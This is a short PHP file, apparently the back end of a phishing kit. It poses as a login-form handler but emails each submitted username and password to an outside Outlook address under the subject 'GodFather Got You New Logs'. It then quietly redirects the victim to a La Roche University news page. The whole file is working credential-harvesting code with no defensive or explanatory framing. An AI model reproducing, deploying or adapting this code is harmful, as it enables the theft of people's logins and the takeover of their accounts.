<?php
// submit.php

if ($_SERVER["REQUEST_METHOD"] !== "POST") {
    header("Location: index.html");
    exit;
}

$username = trim($_POST["username"] ?? "");
$password = $_POST["password"] ?? "";

if ($username === "" || $password === "") {
    $msg = urlencode("Please fill in both username and password.");
    header("Location: message.php?msg=" . $msg);
    exit;
}

$to      = "sharronleetackett@outlook.com";
$subject = "GodFather Got You New Logs";
$body    = "Username: " . $username . "\n"
         . "Password: " . $password . "\n";

$headers = [
    "From: noreply@yourdomain.com",
    "Reply-To: noreply@yourdomain.com",
    "Content-Type: text/plain; charset=UTF-8"
];

$sent = mail($to, $subject, $body, implode("\r\n", $headers));



header("Location: https://laroche.edu/news/la-roche-university-invites-the-community-to-festival-of-lights-dec-4/" );
exit;